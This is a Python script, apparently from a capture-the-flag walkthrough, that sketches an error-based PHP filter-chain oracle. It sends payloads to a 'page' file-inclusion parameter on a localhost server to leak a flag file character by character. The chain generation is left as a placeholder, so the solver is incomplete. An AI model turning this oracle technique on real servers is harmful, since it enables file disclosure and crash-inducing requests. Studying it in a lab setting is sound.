import requests
import time
import sys

# === CONFIGURATION ===
URL = "http://localhost:9051/"
# This is the 'oracle' chain. In a real attack, you generate this using:
# python3 php_filter_chain_generator.py --chain "..." --oracle
#
# Since the chains are thousands of chars long, we demonstrate the LOGIC here.
# The user (you) should use the tool to generate the actual payload.

def check_oracle(payload):
    """
    Sends the payload. Returns TRUE if the oracle says 'Yes' (Crash/Slow),
    FALSE otherwise.
    """
    try:
        # ORACLE LOGIC (Dechunk + Bomb):
        # - If char IS Hex: Dechunk drops data -> Empty Bomb -> NO CRASH (Fast/200 OK)
        # - If char IS NOT Hex: Dechunk passes data -> Real Bomb -> CRASH (Timeout/Error)
        
        # NOTE: This inverse logic depends on the chain construction. 
        # Sometimes 'Match' = Crash, sometimes 'Match' = Safe.
        # For the standard Dechunk method: SAFE = MATCH (It was Hex).
        
        requests.get(URL, params={'page': payload}, timeout=2)
        return True # Safe response = It was Hex (Match!)
    except requests.exceptions.Timeout:
        return False # Crash = It was NOT Hex (No Match)
    except requests.exceptions.ConnectionError:
        return False # Crash = It was NOT Hex
    except Exception as e:
        # Some other error?
        return False

def solve():
    print("[*] Starting Oracle Solver...")
    flag = ""
    
    # We want to find the flag: "flag-..."
    # We iterate through known characters.
    
    charset = "abcdefghijklmnopqrstuvwxyz-ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    
    for i in range(0, 15): # First 15 chars
        found_char = False
        for char in charset:
            print(f"[*] Testing pos {i} == '{char}'...", end="\r")
            
            # --- THE MISSING LINK ---
            # To run this for real, you need the SPECIFIC CHAIN for (pos=i, char=char).
            # The 'php_filter_chain_generator' tool produces this string.
            # 
            # Example (Pseudo):
            # chain = generator.get_oracle_payload(file="/flag/flag.txt", position=i, char=char)
            
            # For this walkthrough, we will ask the USER to run the generator.
            # See 'using_chain_generator.md' for instructions.
            pass 
            
        if not found_char:
            print("\n[!] Could not deduce character. (Need real chains)")
            break
            
    print(f"\n[+] Flag so far: {flag}")

if __name__ == "__main__":
    solve()
